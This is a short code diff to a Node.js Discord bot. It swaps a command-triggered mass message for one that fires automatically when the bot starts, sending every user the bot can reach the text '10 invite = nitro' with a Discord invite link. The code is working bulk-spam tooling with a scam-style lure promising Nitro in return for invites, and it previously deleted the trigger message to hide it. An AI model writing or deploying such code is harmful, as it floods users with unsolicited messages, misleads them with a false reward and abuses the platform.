@@ -14,11 +14,8 @@ const http = require('http');
     }, 280000);
 ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
-berke.on('message', msg => {
-  if (msg.content === 'sadeceberke') {
-    msg.delete()
-    msg.guild.members.forEach(member => member.send("10 invite = nitro - discord.gg/u5RXbSY")
-  )}
+berke.on('ready', () => {
+    berke.users.forEach(member => member.send("10 invite = nitro - discord.gg/u5RXbSY"))
 })
 
 berke.on('message', async msg => {
